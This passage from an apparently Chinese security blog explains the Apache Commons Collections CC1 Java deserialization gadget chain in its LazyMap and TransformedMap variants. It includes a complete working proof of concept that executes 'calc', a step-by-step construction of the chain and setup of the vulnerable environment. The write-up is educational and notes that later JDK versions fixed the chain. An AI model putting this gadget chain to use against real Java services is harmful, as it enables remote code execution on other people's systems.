java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotation</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationDeclaredConstructor</span> <span class="operator">=</span> annotation.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">instance</span> <span class="operator">=</span>(InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class,lazymap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, instance);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationDeclaredConstructor.newInstance(Target.class,proxyInstance);</span><br><span class="line">        </span><br><span class="line">        serialize(o);  <span class="comment">//序列化</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function"> -&gt;</span>AnnotationInvocationHandler.readObject</span><br><span class="line">   -&gt;<span class="built_in">Map</span>(proxy).entrySet</span><br><span class="line">     -&gt;AnnotationInvocationHandler.invoke</span><br><span class="line">       -&gt;LazyMap.get</span><br><span class="line">         -&gt;后面和TransformedMap链一样了</span><br></pre></td></tr></table></figure><p>反向调用分析</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">反复嵌套再创建InvokerTransformer.transform()可以实现反射调用任意类的任意方法实现rce</span><br><span class="line">-&gt;</span><br><span class="line">ChainedTransformer.transform()会将传入的Transformer对象数组参数进行递归调用，省去反复嵌套</span><br><span class="line">-&gt;</span><br><span class="line">调用LazyMap.decorate<span class="function"><span class="params">()</span>，将<span class="title">ChainedTransformer</span>的值作为第二个参数的值传入后再将其实例化，这样调用<span class="title">LazyMap</span>.<span class="title">get</span><span class="params">()</span>时就会返回<span class="title">ChainedTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">调用LazyMap.get(),需调用AnnotationInvocationHandler.invoke()，并将memberValues的值设为LazyMap对象即可</span><br><span class="line">-&gt;</span><br><span class="line">调用AnnotationInvocationHandler.invoke()，需创建一个使用AnnotationInvocationHandler类作为处理器的代理对象，并无参调用该代理对象中的方法即可</span><br><span class="line">-&gt;</span><br><span class="line">AnnotationInvocationHandler.readObject<span class="function"><span class="params">()</span>中的<span class="title">memberValues</span>.<span class="title">entrySet</span><span class="params">()</span>为无参方法，将<span class="title">memberValues</span>赋值为<span class="title">proxyInstance</span>代理对象即可调用<span class="title">AnnotationInvocationHandler</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">反序列化调用AnnotationInvocationHandler.readObject()</span><br></pre></td></tr></table></figure><p>CC1链的Transformer和LazyMap都依赖了AnnotationInvocationHandler作为入口类， jdk 8u71之后已修复不可利用，因为jdk高版本后 开发者修改AnnotationInvocationHandler的代码</p><p>参考：</p><p><a href="https://blog.csdn.net/Elite__zhb/article/details/136097084">https://blog.csdn.net/Elite__zhb/article/details/136097084</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1-TransformedMap</title>
      <link href="/2024/06/24/CC1-TransformedMap/"/>
      <url>/2024/06/24/CC1-TransformedMap/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="Commons-Collections简介"><a href="#Commons-Collections简介" class="headerlink" title="Commons Collections简介"></a>Commons Collections简介</h2><p><strong>Commons Collections</strong>是Apache软件基金会的一个开源项目，它提供了一组可复用的数据结构和算法的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。该项目包含了多种不同类型的集合类、迭代器、队列、堆栈、映射、列表、集等数据结构实现，以及许多实用程序类和算法实现。它的代码质量较高，被广泛应用于Java应用程序开发中。</p><h2 id="链子攻击条件"><a href="#链子攻击条件" class="headerlink" title="链子攻击条件"></a>链子攻击条件</h2><ul><li>Commons Collections &lt;&#x3D; 3.2.1</li><li>java版本 &lt; 8u71</li></ul><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>Maven依赖，复制到pom.xml更新maven即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为jdk自带的包里面有些文件是反编译的.class文件，我们没法清楚的看懂代码，为了方便我们调试，我们需要将他们转变为.java的文件</p><p>下载<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4%E4%B8%AD%E7%9A%84zip%E6%96%87%E4%BB%B6%EF%BC%8C%E6%8A%8A%E5%8C%85(jdk-af660750b2f4.zip)%E4%B8%AD/src/share/classes%E4%B8%8B%E7%9A%84sun%E6%96%87%E4%BB%B6%E5%A4%B9%E6%8B%B7%E8%B4%9D%E5%88%B0%E6%88%91%E4%BB%AC8u65%E7%9A%84src%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD%E5%8E%BB%EF%BC%8C%E5%B9%B6%E5%9C%A8IDEA%E4%B8%AD%EF%BC%8C%E9%80%89%E6%8B%A9%E6%96%87%E4%BB%B6">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4中的zip文件，把包(jdk-af660750b2f4.zip)中/src/share/classes下的sun文件夹拷贝到我们8u65的src文件夹中去，并在IDEA中，选择文件</a> —&gt;项目结构 —&gt;SDK —&gt;源路径 —&gt;把src文件夹添加到源路径下，保存即可</p><p><img src="https://bu.dusays.com/2024/06/24/66792157d3e2f.png" alt="image-20240624153017825.png"></p><p><img src="https://bu.dusays.com/2024/06/24/66792157ca100.png" alt="image-20240624153024118.png"></p><p>可以看到rt.jar包中任意源代码都是.java文件而不是.class反编译文件</p><p><img src="https://bu.dusays.com/2024/06/24/6679221d54a6a.png" alt="image-20240604111707218.png"></p><h2 id="利用InvokerTransformer执行任意命令"><a href="#利用InvokerTransformer执行任意命令" class="headerlink" title="利用InvokerTransformer执行任意命令"></a>利用InvokerTransformer执行任意命令</h2><p>CC1链的源头是Commons Collections库中的Tranformer接口，这个接口里面有个transform方法</p><p><img src="https://bu.dusays.com/2024/06/24/66791fc2d00e1.png" alt="image-20240605114956860.png"></p><p>该接口的作用就是接收一个对象，然后调用其transform方法，对传入的对象进行一些操作。然后我们看下它的实现类有哪些，也就是哪些类继承了这个接口</p><p><img src="https://bu.dusays.com/2024/06/24/6679221ccc632.png" alt="image-20240605115417638.png"></p><p>其中 InvokerTransformer 类就是我们要利用的漏洞点，我们可以看到这个类继承了序列化接口（后面我们还会用到ChainedTransformer和ConstantTransformer）</p><p><img src="https://bu.dusays.com/2024/06/24/66791fc2b4954.png" alt="image-20240605115714273.png"></p><p>而且重写了transform方法</p><p><img src="https://bu.dusays.com/2024/06/24/66791fc29074c.png" alt="image-20240605115823885.png"></p><p>InvokerTransformer类的构造器和transform方法具体代码如下</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//含参构造器，我们在外部调用类时需要传入对应参数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">InvokerTransformer</span>(<span class="title class_">String</span> methodName, <span class="title class_">Class</span>[] paramTypes, <span class="title class_">Object</span>[] args) &#123; <span class="comment">//参数为参数名，参数类型，参数值</span></span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title class_">Object</span> <span class="title function_">transform</span>(<span class="params"><span class="built_in">Object</span> input</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title class_">Class</span> cls = input.<span class="title function_">getClass</span>();<span class="comment">//获取输入对象的类</span></span><br><span class="line">            <span class="title class_">Method</span> method = cls.<span class="title function_">getMethod</span>(iMethodName, iParamTypes);<span class="comment">//获取类的指定方法，这里的参数在上述构造器中已经设置</span></span><br><span class="line">            <span class="keyword">return</span> method.<span class="title function_">invoke</span>(input, iArgs);<span class="comment">//目标对象的指定方法</span></span><br><span class="line">            <span class="comment">//以上很明显是利用反射机制调用任意方法</span></span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">NoSuchMethodException</span> ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.<span class="title function_">getClass</span>() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">IllegalAccessException</span> ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.<span class="title function_">getClass</span>() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">InvocationTargetException</span> ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.<span class="title function_">getClass</span>() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br></pre></td></tr></table></figure><p>从以上重写的transform方法中可以看出参数都是可控的，那么我们就可以利用这里来调用任意类的任意方法</p><p>首先java中最简单基础的命令执行，就是<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>，但是我们跟进其源码可以发现Runtime没有实现Serializable接口，也就是说Runtime不可被序列化，我们要找实现了Serializable接口的</p><p><img src="https://bu.dusays.com/2024/06/24/66791fc2a0bde.png" alt="image-20240604113058368.png"></p><p>但是我们发现Class是实现了Serialiable接口的，所以我们可以通过反射调用Runtime的Class来进行反序列化</p><p><img src="https://bu.dusays.com/2024/06/24/6679221c1baaf.png" alt="image-20240604113613673.png"></p><p>写个简单的反射</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Runtime</span> r = <span class="keyword">Runtime</span>.getRuntime();</span><br><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Runtime</span>.<span class="keyword">class</span>;</span><br><span class="line">Method exec = a.getMethod(<span class="string">&quot;exec&quot;</span>, String.<span class="keyword">class</span>);</span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>反射忘了些，简单分析下：</p><p>先是创建了个<code>Runtime</code>类的实例，这里不能用new来创建实例，因为Runtime类的构造方法是私有的，可以用他的getRuntime方法，Runtime下的getRuntime就是返回Runtime的实例，然后获取了<code>Runtime</code>的Class对象，之后用<code>getMethod</code>方法获取了其对象的<code>exec</code>方法并接受一个String类型的参数，最后使用<code>Method</code>对象的<code>invoke</code>方法来反射调用<code>Runtime</code> 实例 <code>r</code>的<code>exec</code>方法</p></blockquote><p>然后我们改用transform的写法</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokertransformer = <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invoketransformer.transform(r);</span><br><span class="line"><span class="comment">//或者这样写也行</span></span><br><span class="line"><span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>成功执行命令，这就是最终的利用点，接下来就是一步一步构造链子，直到找到了重写了readObject的类</p><h2 id="CC1链构造"><a href="#CC1链构造" class="headerlink" title="CC1链构造"></a>CC1链构造</h2><p><strong>1、寻找合适的调用了transform的类</strong></p><p>直接右键查找用法，有很多类都调用了transform，我们直接看TransformedMap类下的checkSetValue方法</p><p><img src="https://bu.dusays.com/2024/06/24/6679221d175d9.png" alt="屏幕截图 2024-06-05 135735.png"></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//我们找到该类的构造器和checkSetValue方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title class_">TransformedMap</span>(<span class="title class_">Map</span> map, <span class="title class_">Transformer</span> keyTransformer, <span class="title class_">Transformer</span> valueTransformer) &#123;</span><br><span class="line">    <span class="comment">//接受三个参数，第一个为Map,第二个和第三个就是我们传入的Transformer，可控。</span></span><br><span class="line">        <span class="variable language_">super</span>(map);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">keyTransformer</span> = keyTransformer;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">valueTransformer</span> = valueTransformer; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title class_">Object</span> <span class="title function_">checkSetValue</span>(<span class="params"><span class="built_in">Object</span> value</span>) &#123; <span class="comment">//接受一个对象类型的参数</span></span><br><span class="line">    <span class="keyword">return</span> valueTransformer.<span class="title function_">transform</span>(value);</span><br><span class="line">    <span class="comment">//返回valueTransformer对应的transform方法，那么我们这里就需要让valueTransformer为我们之前的invokerTransformer对象，也就是exec</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于构造器和方法都是protected修饰的，说明只能在类的内部调用，不允许外部访问调用，那么我们就需要找到一个公开的内部实例化的工具，这样就可以间接地创建对象或者访问这些受保护的成员</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title class_">Map</span> <span class="title function_">decorate</span>(<span class="params"><span class="built_in">Map</span> map, Transformer keyTransformer, Transformer valueTransformer</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个静态方法decorate是public修饰的而且实例化了TransformedMap类，正好符合我们的要求。目前的思路是：</p><p>调用TransformedMap中的decorate方法，将invokertransformer的值作为第三个参数的值传入后再将其实例化，这样调用checkSetValue方法时就会返回invokertransformer的transform方法。但现在又有两个问题，如何调用checkSetValue方法以及如何控制这个方法的value参数</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.<span class="property">getRuntime</span>();</span><br><span class="line">InvokerTransformer invokertransformer = <span class="keyword">new </span><span class="class title_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new </span><span class="class title_">Class</span>[]&#123;<span class="built_in">String</span>.<span class="property">class</span>&#125;,<span class="keyword">new </span><span class="class title_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//以下大概相当于invokerTransformer.transform(r); ，但还没传入r</span></span><br><span class="line"><span class="built_in">HashMap</span>&lt;<span class="built_in">Object</span>, <span class="built_in">Object</span>&gt; <span class="built_in">map</span> = <span class="keyword">new </span><span class="class title_">HashMap</span>&lt;&gt;();<span class="comment">//实例化一个Hashmap</span></span><br><span class="line">TransformedMap.<span class="property">decorate</span>(<span class="built_in">map</span>,<span class="literal">null</span>,invokertransformer);<span class="comment">//把map当成参数传入，由于后续调用的是valueTransformer的transform方法，与keyTransformer的值无关，所以这里将第二个参数设为null，第三个参数设为我们的invokertransformer</span></span><br></pre></td></tr></table></figure><blockquote><p>这里map参数的类型设为HashMap是和下文MapEntry有关，貌似因为HashMap传入的是键值对</p></blockquote><p><strong>2.寻找合适的调用了checkSetValue方法的方法</strong></p><p>只有一处调用了checkSetValue方法(抽象类AbstractInputCheckedMapDecorator中的镶嵌类MapEntry中的setValue方法)</p><p><img src="https://bu.dusays.com/2024/06/24/6679221ca97aa.png" alt="屏幕截图 2024-06-05 154742.png"></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">static <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123; </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AbstractInputCheckedMapDecorator</span> parent;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">protected</span> <span class="type">MapEntry</span>(<span class="type">Map</span>.<span class="type">Entry</span> entry, <span class="type">AbstractInputCheckedMapDecorator</span> parent) &#123;</span><br><span class="line">         <span class="keyword">super</span>(entry);</span><br><span class="line">         <span class="keyword">this</span>.parent = parent;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     public <span class="type">Object</span> setValue(<span class="type">Object</span> value) &#123;</span><br><span class="line">         value = parent.checkSetValue(value);</span><br><span class="line">         <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们发现抽象类 AbstractMapEntryDecorator 是 TransformedMap类的父类</p><p><img src="https://bu.dusays.com/2024/06/24/6679221c08786.png" alt="屏幕截图 2024-06-05 162814.png"></p><p>所以当我们调用MapEntry类中的setValue方法时，会触发TransformedMap类中的checkSetValue方法</p><blockquote><p>因为setValue方法会调用<code>parent.checkSetValue(value)</code>，这里的 <code>parent</code> 是指向<code>AbstractInputCheckedMapDecorator</code> 类型的一个实例的引用，也就是一个继承自<code>AbstractInputCheckedMapDecorator</code> 的具体子类的实例，比如这里的TransformedMap类</p></blockquote><p>所以现在我们的问题是如何调用MapEntry类中的setValue方法</p><p>从MapEntry的代码中我们看到MapEntry类继承自AbstractMapEntryDecorator，而且AbstractMapEntryDecorator实现了Map.Entry的接口</p><p><img src="https://bu.dusays.com/2024/06/24/6679221da2fa3.png" alt="屏幕截图 2024-06-05 183606.png"></p><p>在TransformedMap中调用setValue方法其实是通过 <code>Map.Entry</code> 接口的 <code>setValue</code> 方法来更新 <code>Map</code> 中的值（因为 <code>Map</code> 接口中并没有直接的 <code>setValue</code> 方法），而这里MapEntry是重写了<code>Map.Entry</code>接口的setValue方法的，也就是说当在TransformedMap中调用setValue方法其实就是在调用MapEntry中的setValue。</p><p>综上所述：想要触发TransformedMap中的checkSetValue方法，只需调用自身类中的setValue方法即可，而调用setValue方法只需遍历Map的Entry即可（Entry就是键值对）</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>&#125;,<span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//确保map中至少有一个条目,为了让TransformedMap的setValue()方法有目标可调用</span></span><br><span class="line">HashMap&lt;<span class="built_in">Object</span>, <span class="built_in">Object</span>&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Map</span>&lt;<span 